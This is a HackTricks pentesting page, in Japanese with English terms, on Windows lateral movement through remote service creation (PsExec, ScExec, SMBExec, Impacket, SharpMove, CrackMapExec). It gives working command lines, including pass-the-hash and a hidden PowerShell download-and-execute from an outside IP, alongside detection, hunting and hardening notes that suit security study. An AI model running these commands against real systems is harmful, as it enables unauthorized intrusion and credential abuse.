# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## どのように動作するか

これらの technique は、SMB/RPC 経由で Windows Service Control Manager (SCM) をリモートから悪用し、対象ホスト上でコマンドを実行します。一般的な流れは次のとおりです。

1. 対象に authenticate し、SMB (TCP/445) 経由で ADMIN$ share にアクセスする。
2. 実行ファイルをコピーするか、service が実行する LOLBAS command line を指定する。
3. SCM (MS-SCMR over \PIPE\svcctl) 経由で、指定した command または binary を指す service をリモートから作成する。
4. service を開始して payload を実行し、必要に応じて named pipe 経由で stdin/stdout を取得する。
5. service を停止して cleanup する（service と配置した binary を削除する）。

Requirements/prereqs:
- 対象上の Local Administrator (SeCreateServicePrivilege)、または対象上で明示的に service を作成する権限。
- SMB (445) に到達可能で、ADMIN$ share が利用可能であること。host firewall で Remote Service Management が許可されていること。
- UAC Remote Restrictions: local account では token filtering により、ネットワーク経由の admin access がブロックされる場合があります。これを回避するには、built-in Administrator または LocalAccountTokenFilterPolicy=1 を使用します。
- Kerberos vs NTLM: hostname/FQDN を使用すると Kerberos が有効になります。IP で接続すると NTLM に fallback することが多く、hardened environment ではブロックされる場合があります。

### sc.exe を使用した手動の ScExec/WinExec

以下は、最小限の service-creation approach を示しています。service image には、配置した EXE、または cmd.exe や powershell.exe のような LOLBAS を指定できます。
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
注意:
- 非サービス EXE の起動時には timeout error が発生するが、execution は実行される。
- より OPSEC に配慮するには、fileless commands（cmd /c、powershell -enc）を優先するか、drop した artifact を削除する。

より詳細な手順は次を参照: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling と使用例

### Sysinternals PsExec.exe

- SMB を使用して ADMIN$ に PSEXESVC.exe を drop し、一時的な service（デフォルト名は PSEXESVC）をインストールして、named pipes 経由で I/O を proxy する classic admin tool。
- 使用例:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Sysinternals Live から WebDAV 経由で直接起動できます:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- service install/uninstall events を残し（`-r` が使用されない場合、Service name は多くの場合 PSEXESVC）、実行中に `C:\Windows\PSEXESVC.exe` を作成する。

### Impacket psexec.py (PsExec-like)

- embedded RemCom-like service を使用する。ADMIN$ 経由で一時的な service binary（一般的にはランダム化された名前）を配置し、service（デフォルトでは多くの場合 RemComSvc）を作成して、named pipe 経由で I/O をプロキシする。
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- C:\Windows\ に一時 EXE（ランダムな 8 文字）。Service name は、上書きされない限りデフォルトで RemComSvc。

### Impacket smbexec.py (SMBExec)

- 一時 service を作成し、cmd.exe を起動して I/O に named pipe を使用する。通常、完全な EXE payload の drop を回避し、command execution は semi-interactive。
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) は、service-based exec を含む複数の lateral movement 手法を実装しています。
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) には、リモートでコマンドを実行するためのサービスの変更/作成機能が含まれています。
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- CrackMapExecを使用して、異なるbackend（psexec/smbexec/wmiexec）経由で実行することもできます：
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC、検知、アーティファクト

PsExec-like techniques の使用時に一般的に確認されるホスト／ネットワーク・アーティファクト：

- 対象上で、使用された admin account に対する Security 4624（Logon Type 3）および 4672（Special Privileges）。
- ADMIN$ へのアクセス、および service binaries（例：PSEXESVC.exe またはランダムな 8 文字の .exe）の作成／書き込みを示す Security 5140/5145 File Share および File Share Detailed events。
- 対象上の Security 7045 Service Install：PSEXESVC、RemComSvc、または custom（-r / -service-name）などの service names。
- services.exe または service image に対する Sysmon 1（Process Create）、3（Network Connect）、C:\Windows\ 内の 11（File Create）、および \\.\pipe\psexesvc、\\.\pipe\remcom_*、またはランダム化された同等の pipes に対する 17/18（Pipe Created/Connected）。
- Sysinternals EULA の Registry artifact：operator host 上の HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（抑制されていない場合）。

## Hunting ideas

- ImagePath に cmd.exe /c、powershell.exe、または TEMP locations が含まれる service installs に対して Alert を設定する。
- ParentImage が C:\Windows\PSEXESVC.exe である process creations、または services.exe の children として LOCAL SYSTEM で実行される shells を探す。
- -stdin/-stdout/-stderr で終わる named pipes、または既知の PsExec clone pipe names に Flag を付ける。

## Troubleshooting common failures

- サービス作成時の Access is denied (5)：実際には local admin ではない、local accounts に対する UAC remote restrictions、または service binary path に対する EDR tampering protection が原因。
- The network path was not found (53)、または ADMIN$ に接続できない：firewall による SMB/RPC の blocking、または admin shares が無効化されていることが原因。
- Kerberos は失敗するが NTLM は blocked：hostname/FQDN（IP ではない）を使用して接続し、適切な SPNs を設定するか、Impacket 使用時に tickets とともに -k/-no-pass を指定する。
- Service start が timeout するが payload は実行された：実際の service binary ではない場合に想定される動作。output を file に capture するか、live I/O には smbexec を使用する。

## Hardening notes

- Windows 11 24H2 および Windows Server 2025 では、outbound（Windows 11 では inbound も）の connections に対して SMB signing が default で required となる。有効な creds を使用する legitimate な PsExec usage は壊さないが、unsigned SMB relay abuse を防止し、signing をサポートしない devices に影響する可能性がある。<sup>[[2]](#references)</sup>
- New SMB client NTLM blocking（Windows 11 24H2/Server 2025）により、IP または non-Kerberos servers への接続時に NTLM fallback が防止される場合がある。hardened environments では、これにより NTLM-based PsExec/SMBExec が機能しなくなる。Kerberos（hostname/FQDN）を使用するか、legitimately 必要な場合は exceptions を configure する。<sup>[[2]](#references)</sup>
- Principle of least privilege：local admin membership を最小化し、Just-in-Time/Just-Enough Admin を優先し、LAPS を enforce し、7045 service installs に対して monitor/alert を行う。

## See also

- WMI-based remote exec（より fileless な場合が多い）：

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec：

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
